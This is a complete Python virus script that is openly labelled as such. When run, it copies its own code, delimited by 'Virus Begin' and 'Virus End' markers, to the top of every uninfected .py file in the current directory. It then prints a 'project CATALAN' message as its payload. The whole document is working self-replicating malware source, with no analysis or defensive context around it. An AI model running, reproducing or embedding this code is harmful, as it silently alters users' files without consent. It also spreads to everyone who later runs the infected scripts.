##### Virus Begin #####
import sys, glob, re

# Get a Copy of the Virus
vCode = []
fh = open(sys.argv[0], "r")
lines = fh.readlines()
fh.close()
inVirus = False
for line in lines:
    if (re.search('^##### Virus Begin #####', line)): inVirus = True
    if (inVirus): vCode.append(line)
    if (re.search('^##### Virus End #####', line)): break

# Find Potential Victims
progs = glob.glob("*.py")

# Check and Infect
for prog in progs:
    fh = open(prog, "r")
    pCode = fh.readlines()
    fh.close()
    infected = False
    for line in pCode:
        if ('##### Virus Begin #####' in line):
            infected = True
            break
    if not infected:
        newCode = []
        if ('#!' in pCode[0]): newCode.append(pCode.pop(0))
        newCode.extend(vCode)
        newCode.extend(pCode)
        # Writing new virus infected code
        fh = open(prog, 'w')
        fh.writelines(newCode)
        fh.close()

#Payload
print("You have been inducted into project CATALAN. Congratulations!")
##### Virus End #####
